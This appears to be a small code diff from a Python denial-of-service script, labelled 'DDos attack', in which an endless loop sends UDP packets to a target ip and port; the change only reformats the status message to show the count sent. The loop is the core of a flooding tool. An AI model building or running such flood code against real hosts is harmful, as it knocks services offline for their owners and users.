@@ -55,5 +55,5 @@ sent = 0
 while True:
    s.sendto(type,(ip,port))
    sent += 5
-   print("DDos attack ip {} - port {} - sending".format(ip,port,sent))
+   print("DDos attack ip - {} - port {} - {} sending".format(ip,port,sent))
 
